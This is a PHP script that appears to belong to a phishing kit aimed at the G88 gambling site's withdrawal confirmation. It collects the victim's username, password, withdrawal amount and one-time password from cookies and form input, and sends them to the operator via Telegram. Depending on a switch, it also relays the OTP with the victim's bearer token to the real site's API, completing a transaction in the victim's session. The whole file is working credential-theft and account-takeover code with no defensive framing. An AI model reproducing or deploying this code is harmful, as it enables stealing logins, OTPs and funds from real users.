<?php
session_start();
include "../config.php";
$auth_token = $_SESSION["auth"];
$raw_data = file_get_contents("php://input");
$json_data = json_decode($raw_data, 1);

$OTP = $json_data['OTP'];
$OTPType = $json_data['OTPType'];
if (!$OTP){
echo '{"c":-1019,"m":""}';
return;
}

if (strlen($OTP) < 6 || strlen($OTP) > 6) {
    echo '{"c":-7,"m":""}';
    return;
}     

if ($mo_ket) {
	date_default_timezone_set("Asia/Ho_Chi_Minh");
	$time = date("H:i:s Y-m-d");
	$ip=$_SERVER["REMOTE_ADDR"];
	$username = $_COOKIE["username"];
    $password = $_COOKIE["password"];
    $Amount = $_COOKIE["Amount"];
	// gữi thông tin về tele
	$message = "Rut ket: G88\nTài khoản: $username\nMật khẩu: $password\nAmount: $Amount\nOTP: $OTP\nThời Gian: $time";
	send_telegram_trans($message);

	die('{"c":-1025,"m":""}');
}

$url = "https://profile.g88.vin/api/payment/UnReserveBalanceConfirm";
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_POST,true);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_HEADER,0);
    $data = "{\"OTP\":$OTP,\"OTPType\":\"$OTPType\"}";
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch,CURLOPT_HTTPHEADER,["authority: profile.g88.vin","Authorization: Bearer $auth_token","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36","Content-Type: application/json","Accept: application/json","Referer: http://m88.vin/","Accept-Language: vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,und;q=0.6,de;q=0.5,pl;q=0.4"]);
    $result = curl_exec($ch);
    echo $result;


?>